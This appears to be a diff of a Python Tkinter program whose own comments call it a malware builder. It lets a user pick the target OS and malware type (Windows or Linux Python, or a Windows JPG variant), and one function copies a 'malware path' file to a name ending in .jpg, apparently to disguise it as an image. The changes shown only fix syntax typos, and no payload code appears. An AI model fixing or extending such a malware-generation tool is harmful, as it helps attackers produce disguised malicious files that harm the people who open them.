@@ -10,11 +10,11 @@ import string
 
 def main():
     #this will determine the target os of malware and the type of malware
-    if choice s==1:
+    if choices==1:
         pythwin()
-    if choice s==2:
+    if choices==2:
         pythlin()
-    if choice s==3:
+    if choices==3:
         jpgwin()
     return
 
@@ -106,7 +106,7 @@ def jpgwin():
     input2 = entry3.get()
     # Open file
     file_name = malwarename  # Malware path
-    new_file_name = input 2 +".jpg"  # Path to drop file
+    new_file_name = input2 +".jpg"  # Path to drop file
     file = open(file_name, "rb")
     file_data = file.read()
     file.close()
@@ -163,7 +163,7 @@ canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
 canvas.pack()
 background_image = tk.PhotoImage(file='yaj.png')
 background_label = tk.Label(root, image=background_image)
-background_label.imag e= background_image
+background_label.image= background_image
 background_label.place(relwidth=1 ,relheight=1)
 root.resizable(False, False)
 
@@ -215,7 +215,7 @@ entry3.focus_set()
 # button mashing
 button = tk.Button(root, text="MEWTIFY", bg="purple", font=40, command=main)
 button.place(relx=0.3, rely=0.8, relwidth=0.45, relheight=0.15)
-button 1 =tk.Button(root, text="click to exit", bg= "red", font =10 ,command=root.destroy)
+button1 =tk.Button(root, text="click to exit", bg= "red", font =10 ,command=root.destroy)
 button1.place(relx=.8, rely=0.9, relwidth=0.15, relheight=0.05)
 
 root.mainloop()
